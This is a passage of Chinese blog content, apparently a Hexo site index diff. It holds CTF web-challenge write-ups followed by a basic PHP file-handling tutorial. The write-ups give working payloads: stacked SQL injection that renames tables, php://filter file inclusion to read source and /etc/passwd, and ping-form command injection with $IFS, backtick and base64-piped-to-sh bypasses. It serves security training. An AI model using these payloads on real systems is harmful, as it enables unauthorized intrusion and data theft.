+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>过滤了 select，update，delete，drop，insert，where 和 点</p>
+<p>过滤了这么多词，尝试堆叠注入</p>
+<p>4.查询数据库</p>
+<p>输入1’;show databases;# 成功回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>说明存在堆叠注入</p>
+<p>5.查询表</p>
+<p>输入1’;show tables;# 成功回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到两个表words和1919810931114514</p>
+<p>6.查询表中字段</p>
+<p>查看1919810931114514，输入1’; show columns from <code>1919810931114514</code>; #</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到1919810931114514中有我们想要的flag字段</p>
+<p>7.查询另一个表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现flag，因为查看flag的回显会出现在words里，为了回显在flag所属的表，而发现alter、rename又没有被过滤，则试着进行表和字段的重命名</p>
+<p>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。然后程序查询就能查询到原本‘1919810931114514’表中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br><span class="line">#rename命令用于修改表名。</span><br><span class="line">#rename命令格式：rename table 原表名 to 新表名;</span><br><span class="line">#alert修改字段名及字段属性值</span><br><span class="line">alert table 表名 change 旧字段名 新字段名 新字段属性; </span><br></pre></td></tr></table></figure>
+
+<p>输入1’ or 1&#x3D;’1,查询就得到flag</p>
+<h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>打开页面只有一个a标签的超链接，指向的是?file&#x3D;flag.php。结合题目的名称不难联想到这是一题文件包含的题目。</p>
+<pre><code>看到当?file=flag.php时，页面返回Can you find out the flag。先输入?file=/etc/passwd，确认一下有没有返回，是否真的有文件包含的漏洞。
+</code></pre>
+<p>看到确实存在文件包含漏洞，目前又没有其他的信息。我们不知道真正的flag藏在那个页面中。所以只能先用文件包含漏洞中php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource伪协议帮我们返回已知页面的代码。输入<code>?file=php://filter/convert.base64-encode/resource=index.php</code>就能得到index.php的源代码的base64密文。解密后得到一下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#x27;hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>大概意思就是过滤了php的几个伪协议，但刚好没过滤我们这个。<br>所以可以我们可以看到返回的结果<br>那现在就取一下flag.php的内容</p>
+<p> 输入?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php就能得到flag.php的源代码的base64密文。解密后得到一下内容里面就有flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;ace2c6ad-88d7-4c5d-a49e-38baeba72c32&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>打开题目就看到大大的PING,二话不说直接ping个本地ip</p>
+<p>涉及知识点：</p>
+<pre><code>在命令执行的过程中，可以通过一些常用特殊字符来执行其他语句
+
+；  //命令分割符，即当执行完第一个命令，继续执行下一个命令
+
+|   //管道
+</code></pre>
+<p>那么尝试在当前文件夹下，有什么东西吧</p>
+<p>构造payload</p>
+<pre><code> 127.0.0.1;ls
+</code></pre>
+<p> 我们都知道在linux系统搭建的页面，通常显示页面的路径是&#x2F;var&#x2F;www&#x2F;html，那么我们尝试返回当前路径查找</p>
+<p>构造payload</p>
+<pre><code> 127.0.0.1;cd ../../../;ls
+</code></pre>
+<p>在返回前三层的时候找到了flag 字样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<pre><code>127.0.0.1;cd ../../../;cat flag
+</code></pre>
+<p>flag{977043da-6f7d-4f7a-9e8e-2c65837cb657}</p>
+<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>（1）页面里显示&#x2F;?ip&#x3D;,很明显要以ping的形式传一个参数给ip，并且我们要想执行其他命令，就要用命令分隔符也就是管道符连接，命令分隔符可以用”;“”|“”&amp;”三种，本题经过尝试发现第一步查看目录过滤了|，&amp;和空格。<br>这里介绍两种方式：<br>1.ping本地127.0.0.1<br>2.用||来代替127.0.0.1；<br>（2）虽然找到了放flag的文件，但是尝试后发现都不对，这里介绍一种思路，我们可以通过查看index.php的文件源码来查看源码，从而确认过滤了哪些东西，题目说过滤了命令连接符&amp;，\，空格，*，bash，&lt;&gt;，flag，？，我们得想一些其他方法来绕过<br>（3）要想得到flag了，我们需要绕过过滤掉的东西<br>这里介绍三种可以解决的特殊绕过方式：<br>1.拼接绕过法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>以上是题目给的绕过flag的源码，我们这里需要知道这是正则表达式匹配了ip的值中是否顺序出现了f、l、a、g四个字母。这样一来我们就可以拼接一个flag来绕过了，可以拼接f;lag fl;ag fla;g 但是这里需要注意：本题特殊就特殊在flag的字母顺序要不同（拼接绕过的一个大坑）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=g;x=fla;$x$y</span><br><span class="line">y=ag;x=fl;$x$y</span><br><span class="line">y=lag;x=f;$x$y</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：&#x2F;?ip&#x3D;||y&#x3D;ag;x&#x3D;fl;cat$IFS$9$x$y.php跑一下查看源码得到flag</p>
+<p>2.内联执行法<br>可以看到代码没有过滤掉符号&#96; 所以可以利用内联执行的方式直接打开flag文件,先执行命令ls，再把ls得到的文件名全部用命令cat打开，构建payload 跑一下，查看源码拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$6`ls`或者/?ip=||cat$IFS$6`ls`</span><br></pre></td></tr></table></figure>
+
+<p>3.sh编码绕过法(base64编码)</p>
+<p>使用方法：echo 命令编码|base64 -d|sh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh可以换成bash, 但是题目过滤掉了</span><br><span class="line">也可以换成其他的编码形式，这里用base64的</span><br><span class="line">空格用$IFS$6替换掉</span><br><span class="line">cat flag.php 的base64编码为Y2F0IGZsYWcucGhw</span><br></pre></td></tr></table></figure>
+
+<p>构造payload ， 相当于执行命令cat flag.php,查看源码得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br><span class="line">/?ip=||echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h1><p>1.试试sql注入正常套路<br>（1）先试试1有回显<br>（2）再试试字母a没有回显<br>（3）试试单引号注入<code>1&#39; or &#39;1&#39;=&#39;1</code>,提示不一样，因此猜测这里有注入点<br>（4）试试有多少列,<code>1&#39; order by 4#</code>,还是不成功，因此一般的联合查询在这里不能使用<br>（5）基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注,<code>1&#39; and length(database())&gt;=1</code>还是不成功<br>2.利用堆叠注入<br>（1）查找所有数据库,1;show databases;#</p>
+<p>（2）查询所有表名,1;show tables;#</p>
+<p>（3）查询Flag表中的列,1;show columns from Flag#,不成功<br>3.接下来是网上的两种解法<br>（1）第一种是猜出了源码<strong>select $_POST[‘query’] || flag from Flag</strong>,<br>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p>
+<p>因此只需要将<br>$_POST[‘query’]</p>
+<p>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql&#x3D;select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为  *,1</p>
+<p>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p>
+<p>执行payload：<code>*,1</code>,得到flag<br>（2）第二种是将||作为字符串连接符，因此需要在语句中更改其配置<br>sql_mode&#x3D;PIPES_AS_CONCAT时即可<br>Payload:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>拼接完之后：select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag<br>相当于是select 1 from Flag和select flag from Flag,得到flag</p>
+<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>先看一下题目,有注入点，这里怀疑是SQL注入</p>
+<p>先尝试读取一下index.php</p>
+<p>这里使用php伪协议</p>
+<p>payload：</p>
+<p>php:&#x2F;&#x2F;filter:&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
+<p>存在文件包含漏洞，但是这里报错了，分析之后是无法打开流：操作失败</p>
+<p>这里去除php后缀</p>
+<p>payload</p>
+<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171203176.png" alt="image-20230805171203176"></p>
+<p>解码之后找到index.php</p>
+<pre><code>&lt;?php
+                $file = $_GET[&#39;category&#39;];
+
+                if(isset($file))
+                &#123;
+                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
+                        include ($file . &#39;.php&#39;);
+                    &#125;
+                    else&#123;
+                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
+                    &#125;
+                &#125;
+                ?&gt;
+</code></pre>
+<p>传入的category参数必须有woofers,meowers,index才行</p>
+<p>这里构造payload来包含flag.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?category=woofers/../flag</span><br></pre></td></tr></table></figure>
+
+<p>这里使用的知识点是php:&#x2F;&#x2F;filter伪协议套协议</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171429538.png" alt="image-20230805171429538"></p>
+<p>base64解码得CTF{happiness_needs_no_filters}</p>
+]]></content>
+      <tags>
+        <tag>ctf解题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP</title>
+    <url>/2023/08/09/PHP/</url>
+    <content><![CDATA[<h2 id="基本的-PHP-语法"><a href="#基本的-PHP-语法" class="headerlink" title="基本的 PHP 语法"></a>基本的 PHP 语法</h2><span id="more"></span>
+
+<p>PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束：</p>
+<?php
+ // PHP 代码
+ ?>
+
+<p>PHP 文件的默认文件扩展名是 “.php”。</p>
+<p>PHP echo 和 print 语句</p>
+<p>echo 和 print 区别:</p>
+<ul>
+<li>echo - 可以输出一个或多个字符串</li>
+<li>print - 只允许输出一个字符串，返回值总为 1</li>
+</ul>
+<p> goto循环语句</p>
+<pre><code>王同学每周往返,但有一个特例:项目失败后或者集团临时通知除外,就可以不再这么每周往返了.
+</code></pre>
+<p>基本语法:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">goto wan;</span><br><span class="line">echo &#x27;天王盖地虎&#x27;;</span><br><span class="line">wan:</span><br><span class="line">echo &#x27;小鸡炖蘑菇&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>基本编写:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=0;$i&lt;100;$i++)&#123;</span><br><span class="line">    echo &#x27;第&#x27;.$i.&#x27;每周往返北京大连&lt;br /&gt;&#x27;;</span><br><span class="line">    if($i == 17)&#123;</span><br><span class="line">        goto end;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">end:</span><br><span class="line">echo &#x27;停止此项&#x27;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PHP文件系统管理"><a href="#PHP文件系统管理" class="headerlink" title="PHP文件系统管理"></a>PHP文件系统管理</h3><p>(1)fopen、fread、fclose操作读取文件</p>
+<p>1.readfile读取文件函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readfile ( string: $文件名)</span><br><span class="line">功能：传入一个文件路径，输出一个文件。</span><br></pre></td></tr></table></figure>
+
+<p>下面的这一段代码中，只要传入文件名或者指定的文件路径就把文件读取出来了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //linux类的读了方式</span><br><span class="line">   readfile(&quot;/home/paul/test.txt&quot;);</span><br><span class="line">   //windows类的读取方式</span><br><span class="line">   readfile(&quot;c:\oldboyoldboyoot.ini&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">注意：上面的代码中windows的斜线是斜线，可能会转义掉一些字符。因此，我们写的时候写上两个斜线。</span><br></pre></td></tr></table></figure>
+
+<p>2、file_get_contents打开文件函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;NoAlike.txt&#x27;;</span><br><span class="line">   $filestring = file_get_contents($filename);</span><br><span class="line">   echo $filestring;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3、fopen、fread、fclose操作读取文件</p>
+<p>上面file_get_contents打开文件的方式简单、粗暴。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource fopen	 	    ( string $文件名, string 模式)</span><br><span class="line">string fread 			( resource $操作资源, int 读取长度)</span><br><span class="line">bool fclose 			( resource $操作资源 )</span><br></pre></td></tr></table></figure>
+
+<p>fopen的模式有下面几个</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230809110222323.png" alt="image-20230809110222323"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //你可以创建一个NoAlike.txt，以只读模式打开</span><br><span class="line">   $fp = fopen(&#x27;NoAlike.txt&#x27;, &quot;r&quot;);</span><br><span class="line">   //var_dump()操作一下$fp看看效果，输出的是不是只有类型提示的是resource</span><br><span class="line">   var_dump($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(2)PHP创建和修改文件内容</p>
+<p>1、file_put_contents写入文件</p>
+<p>第一种写入文件的方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_put_contents ( string $文件路径, string $写入数据)</span><br><span class="line">功能：向指定的文件当中写入一个字符串，如果文件不存在则创建文件。返回的是写入的字节长度</span><br></pre></td></tr></table></figure>
+
+<p>操作代码演示示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $data = &quot;在PHP中文网学好PHP，不再话下！&quot;;</span><br><span class="line">   $numbytes = file_put_contents(&#x27;test.txt&#x27;, $data);</span><br><span class="line">   if($numbytes)&#123;</span><br><span class="line">       echo &#x27;写入成功，我们读取看看结果试试：&#x27;;</span><br><span class="line">       echo file_get_contents(&#x27;test.txt&#x27;);</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">       echo &#x27;写入失败或者没有权限，注意检查&#x27;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、fwrite配合fopen进行写入操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   $fp= fopen($filename, &quot;w&quot;);</span><br><span class="line">   $len = fwrite($fp, &#x27;我是一只来自北方的狼，却在南方冻成了狗&#x27;);</span><br><span class="line">   fclose($fp);</span><br><span class="line">   print $len .&#x27;字节被写入了</span><br><span class="line">&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码说明：<br>· 不论有没有新建都会打开文件重新写入<br>· 原有的文件内容会被覆盖掉<br>· 文件不存在会创建</p>
+<p>(3) PHP创建临时文件</p>
+<pre><code>我们之前创建的文件都是永久文件，而创建临时文件在我们平时的项目开发中也非常有用，创建临时文件的好处：文件操作完成后即删除，不需要去维护这个文件的删除状态。
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //创建了一个临时文件</span><br><span class="line">   $handle = tmpfile();</span><br><span class="line">   //向里面写入了数据</span><br><span class="line">   $numbytes = fwrite($handle, &#x27;写入临时文件&#x27;);</span><br><span class="line">   //关闭临时文件，文件即被删除</span><br><span class="line">   fclose($handle);</span><br><span class="line">   echo  &#x27;向临时文件中写入了&#x27;.$numbytes . &#x27;个字节&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(4) php移动、拷贝和删除文件</p>
+<p>我们日常在处理文件的时候，可以删除文件、重命名文件也可以也可复制文件。</p>
+<p>1、重命名文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rename($旧名,$新名);</span><br><span class="line">功能：这个函数返回一个bool值，将旧的名字改为新的名字。</span><br></pre></td></tr></table></figure>
+
+<p>操作示例说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //旧文件名</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   //新文件名</span><br><span class="line">   $filename2 = $filename . &#x27;.old&#x27;;</span><br><span class="line">   //复制文件</span><br><span class="line">   rename($filename, $filename2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2、复制文件<br>复制文件，就相当于是克隆技术，将一个原来的东西再克隆成一个新的东西，两个长得一模一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy(源文件,目标文件)</span><br><span class="line">功能：将指定路径的源文件，复制一份到目标文件的位置。</span><br></pre></td></tr></table></figure>
+
+<p>操作示例说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   //旧文件名</span><br><span class="line">   $filename = &#x27;copy.txt&#x27;;</span><br><span class="line">   //新文件名</span><br><span class="line">   $filename2 = $filename . &#x27;_backup&#x27;;</span><br><span class="line">   //修改名字。</span><br><span class="line">   copy($filename, $filename2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>说明：会通过上面的例子，发现多出来了一个文件。</p>
+<p>3、删除文件</p>
+<p>删除文件就是将指定路径的一个文件删除，不过这个删除是直接删除。使用的是windows电脑，你在回收站看不到这个文件，你只会发现这个文件消失了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unlink(指定路径的文件)</span><br></pre></td></tr></table></figure>
+
+<p>代码操作示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $filename = &#x27;test.txt&#x27;;</span><br><span class="line">   if (unlink($filename)) &#123;</span><br><span class="line">       echo  &quot;删除文件成功 $filename!</span><br><span class="line">&quot;;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">       echo  &quot;删除 $filename 失败!</span><br><span class="line">&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>4、检测文件属性函数</p>
+<p>假设安装界面的网址是：install.php，安装的锁文件是install.lock。我们就可以检测install.lock文件是否存在。</p>
+<pre><code>&lt;?php
+if(file_exists(&#39;install.lock&#39;))&#123;
+   echo &#39;已安装，请不要再次进行安装&#39;;
+   exit;
+&#125;
+?&gt;
+</code></pre>
+<p>5、PHP目录处理函数</p>
+<p>php 目录处理函数处理文件夹的基本思想如下：<br>1.读取某个路径的时候判断是否是文件夹<br>2.是文件夹的话，打开指定文件夹，返回文件目录的资源变量<br>3.使用readdir读取一次目录中的文件，目录指针向后偏移一次<br>4.使用readdir读取到最后，没有可读的文件返回false<br>5.关闭文件目录<br><strong>代码演示操作</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//设置打开的目录是D盘</span><br><span class="line">$dir = &quot;d:/&quot;;</span><br><span class="line">//判断是否是文件夹，是文件夹</span><br><span class="line">if (is_dir($dir)) &#123;</span><br><span class="line">   if ($dh = opendir($dir)) &#123;</span><br><span class="line">      //读取到最后返回false，停止循环</span><br><span class="line">      while (($file = readdir($dh)) !== false) &#123;</span><br><span class="line">           echo &quot;文件名为: $file : 文件的类型是: &quot; . filetype($dir . $file) . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">       closedir($dh);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>6、php 文件权限设置<br>chmod主要是修改文件的的权限</p>
+<pre><code>&lt;?php
+//修改linux系统/var/wwwroot/某文件权限为755
+chmod(&quot;/var/wwwroot/index.html&quot;, 755);  
+chmod(&quot;/var/wwwroot/index.html&quot;, &quot;u+rwx,go+rx&quot;); 
+chmod(&quot;/somedir/somefile&quot;, 0755); 
+?&gt;
+</code></pre>
+<p>7、php文件路径函数</p>
+<p>我们经常会遇到处理文件路径的情况。例如：<br>1.文件后缀需要取出来<br>2.路径需要取出名字不取目录<br>3.只需要取出路径名中的目录路径<br>4.或者把网址中的各个部份进行解析取得独立值<br>5.甚至是自己组成一个url出来</p>
+<p>很多地方都需要用路径处理类的函数。把常用的路径处理函数为大家做了标注，对着这个路径处理函数进行处理即可：在这里插入图片描述</p>
+<p>代码示例说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path_parts = pathinfo(&#x27;d:/www/index.inc.php&#x27;);</span><br><span class="line">echo &#x27;文件目录名：&#x27;.$path_parts[&#x27;dirname&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;文件全名：&#x27;.$path_parts[&#x27;basename&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;文件扩展名：&#x27;.$path_parts[&#x27;extension&#x27;].&quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo &#x27;不包含扩展的文件名：&#x27;.$path_parts[&#x27;filename&#x27;].&quot;&lt;br /&gt;&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>8、php实现文件留言本</p>
+<p>我们来看一下文件结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php		展示输入框和留言内容</span><br><span class="line">write.php 		向message.txt写入数据</span><br><span class="line">message.txt 		存入聊天内容</span><br></pre></td></tr></table></figure>
+
+<p>编写index.php文件信息：</p>
